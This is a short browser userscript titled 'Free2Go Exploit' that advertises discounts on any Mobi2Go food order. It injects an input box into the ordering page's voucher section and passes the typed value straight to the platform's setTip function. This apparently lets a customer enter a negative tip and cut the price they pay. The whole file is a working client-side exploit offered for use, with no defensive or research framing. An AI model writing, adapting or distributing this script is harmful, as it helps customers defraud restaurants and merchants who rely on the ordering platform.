// ==UserScript==
// @name        Free2Go Exploit
// @namespace   nz.co.makereti.free2goexploit
// @description Give yourself discounts on any Mobi2Go orders
// @include     *
// @version     1
// ==/UserScript==


window.addEventListener('load', () => {
    if (!Mobi2Go) {
        return;
    }
    console.log('Mobi2Go Detected');
    
    
    let currTip = Mobi2Go.Order.getTip() || '';
    let injection = "<input id=\"testHackDiscount\" data-code-input=\"\" class=\"m2g-input m2g-input m2g-form-element--full-width\" placeholder=\"Enter Discount Amount\" type=\"number\">";
    $(".m2g-order-voucher").append(injection);
    $("#testHackDiscount").val(currTip[0]);
    $("#testHackDiscount").on('input', (e) => {
        let newTip = parseFloat($("#testHackDiscount").val());
        Mobi2Go.Order.setTip(newTip);
    });
}, false);

